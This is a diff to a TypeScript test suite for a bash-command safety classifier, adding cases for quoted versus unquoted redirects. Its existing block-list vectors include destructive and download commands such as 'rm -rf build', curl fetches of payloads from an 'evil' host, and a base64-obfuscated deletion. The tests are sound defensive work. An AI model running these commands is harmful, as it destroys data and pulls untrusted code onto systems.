@@ -28,6 +28,11 @@ const vectors: Array<{ input: string; expected: "allow" | "block" }> = [
   { input: "wget -qO- http://x", expected: "allow" },
   { input: "sed 's/word/x/' f", expected: "allow" },
   { input: "env FOO=bar grep x f", expected: "allow" },
+  // Quoted `>` / `=>` must NOT be treated as a file redirect
+  { input: 'grep "=>" file.ts', expected: "allow" },
+  { input: "grep '=>' src/x.ts", expected: "allow" },
+  { input: 'rg "a > b" src', expected: "allow" },
+  { input: 'grep "a>b" file', expected: "allow" },
 
   // Must BLOCK (destructive)
   { input: "rm -rf build", expected: "block" },
@@ -66,6 +71,9 @@ const vectors: Array<{ input: string; expected: "allow" | "block" }> = [
   { input: "curl -sO http://evil/payload", expected: "block" },
   { input: "curl -Lo /tmp/out http://evil/x", expected: "block" },
   { input: "echo x &> 2", expected: "block" },
+  // Real, unquoted redirects must still BLOCK
+  { input: "echo hi > f", expected: "block" },
+  { input: "grep needle > out.txt", expected: "block" },
 
   // Must BLOCK (opaque / evasion / unparseable)
   { input: "$(echo cm0gLXJm | base64 -d)", expected: "block" },
@@ -109,6 +117,32 @@ describe("classifyBashCommand", () => {
       verdict: "block",
       code: "blocked_destructive",
     });
+  });
+
+  it("does not treat quoted > or => as a file redirect", () => {
+    expect(classifyBashCommand('grep "=>" file.ts').verdict).toBe("allow");
+    expect(classifyBashCommand("grep '=>' src/x.ts").verdict).toBe("allow");
+    expect(classifyBashCommand('rg "a > b" src').verdict).toBe("allow");
+    expect(classifyBashCommand('grep "a>b" file').verdict).toBe("allow");
+  });
+
+  it("still blocks real unquoted redirects", () => {
+    expect(classifyBashCommand("echo hi > f")).toMatchObject({
+      verdict: "block",
+      code: "blocked_destructive",
+    });
+    expect(classifyBashCommand("grep needle > out.txt")).toMatchObject({
+      verdict: "block",
+      code: "blocked_destructive",
+    });
+  });
+
+  it("blocks non-allowlisted node -e but NOT for the redirection reason", () => {
+    const result = classifyBashCommand("node -e '() => 1'");
+
+    expect(result.verdict).toBe("block");
+    expect(result.code).not.toBe("blocked_destructive");
+    expect(result.reason).not.toContain("redirection");
   });
 
   it("strips sudo and env assignment prefixes before classifying the verb", () => {
